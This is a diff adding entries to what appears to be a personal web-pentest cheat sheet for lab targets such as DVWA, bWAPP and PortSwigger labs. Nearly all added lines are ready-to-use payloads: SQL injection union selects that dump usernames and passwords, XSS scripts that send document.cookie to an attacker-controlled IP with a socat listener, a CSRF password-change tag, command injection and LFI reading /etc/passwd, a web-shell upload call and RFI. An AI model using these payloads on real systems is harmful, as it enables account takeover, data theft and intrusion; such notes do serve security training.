@@ -81,6 +81,30 @@ sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that yo
 6.1 In the shell type-   TASKLIST  (to view the tasks)
 6.2 Use systeminfo for windows to get all os version
 6.3 Use uname -a for linux to get os version
+
+a' order by 1-- -
+a' order by 2-- -
+a' order by 3-- -
+a' order by 4-- -
+a' order by 5-- -
+a' order by 6-- -
+a' order by 7-- -
+a' order by 8-- -
+
+a' union select 1,2,3,database(),4,5,6-- -
+a' union select 1,2,3,table_name,4,5,6 from information_schema.tables-- -
+a' union select 1,2,3,table_name,4,5,6 from information_schema.tables where table_name like 'u%'-- -  [Busca a tabela que comece um a leta U]
+a' union select 1,2,3,table_name,4,5,6 from information_schema.tables where table_schema=database()-- -
+a' union select 1,2,3,column_name,4,5,6 from information_schema.columns where table_name='users'-- -
+a' union select 1,2,login,password,4,5,6 from users-- - 
+a' union select 1,2,group_concat(login,password),4,5,6,7 from users-- -
+a' union select 1,2,concat_ws('<-->',login,password,id),3,4,5,6 from users-- -
+
+Union select 'abc' FROM dual--
+https://0ab7002a042b241e98520d250098005d.web-security-academy.net/filter?category=Pets'+UNION+SELECT+'Pets','def'+FROM+dual--
+https://0ab7002a042b241e98520d250098005d.web-security-academy.net/filter?category=Pets'+UNION+SELECT+BANNER,NULL+FROM+v$version--
+'+UNION+SELECT+'abc','def'+FROM+dual--
+'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
 ```
 # Android
 ```
@@ -211,3 +235,93 @@ More reference: https://www.comparitech.com/net-admin/wireshark-cheat-sheet/
 
 To find DOS: Look for Red and Black packets with around 1-2 simple packets in between and then pick any packet and check the Source and Destination IP with port(As per question)
 ```
+
+# XSS
+```
+<script>alert(20)</script>
+
+cd/var/www/html
+
+vim vinicius_clemente.html
+
+	XSS feito com sucesso
+	:wq
+
+ifconfig eth0 (pega o ip)
+
+192.168.198.200/vinicius_clemente.html
+
+<iframe src="http://192.168.198.200/vinicius_clemente_teste.php" style="width:1200px; wigth:200px"></iframe>
+
+----- XSS JSON
+aa<script>alert(10)</script>bb
+"}]}';alert(10)</script>
+
+
+---- XSS AJAX/JSON
+<img src=a onerror=alert(10)>
+
+---- XSS AJAX/XML
+&lt;img src=a onerror=alert(10)&gt;
+
+---- XSS USER-AGENT
+GET /bWAPP/xss_user_agent.php HTTP/1.1
+Host: 10.21.3.4
+User-Agent: <script>alert(10)</script>
+
+---- XSS EVAL
+http://10.21.3.4/bWAPP/xss_eval.php?date=alert(10)
+
+---- XSS HREF
+http://10.21.3.4/bWAPP/xss_href-2.php?name=><script>alert(10)</script>
+
+	
+							-- XSS STORED -- DVWA
+<script>alert("asdfasdfasdf
+
+<script>document.write('<img src="http://192.168.198.200:36200/?'+document.cookie+'"/>');</script>
+
+<script>document.write
+('
+	<img 
+		src="
+			http://192.168.198.200:36894/?'+document.cookie+'
+		    "
+	/>
+');
+</script>
+
+OPEN PORT IN KALI
+socat TCP-Listen:36894 -
+
+-------------- MULTILIDAE II - OWASP 2017 -> A7 -> VIA INPUT -> ADD TO YOUR BLOG
+<b> 
+<script>document.write(\'<img src="http://192.168.198.200:36200/?\'+document.cookie+\'"/>\');</script>
+</b>
+
+							-- CSRF -- 
+<img src="/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change#">
+```
+
+# Command Injection
+```
+27.0.0.1; ls
+127.0.0.1 &;cat /etc/passwd
+127.0.0.1|cat /etc/passwd
+
+FILE UPLOAD
+http://10.21.3.4/hackable/uploads/img01.php?cmd=cat /etc/passwd
+
+
+LFI - Local File Inclusion
+http://10.21.3.4/vulnerabilities/fi/?page=/etc/passwd
+http://10.21.3.4/vulnerabilities/fi/?page=file:///etc/passwd
+
+RFI - Remote File Inclusion
+file = vinicius_clemente.txt
+
+<?php phpinfo(); ?>
+http://10.21.3.4/vulnerabilities/fi/?page=http://192.168.198.200/vinicius_clemente.txt
+
+```
+
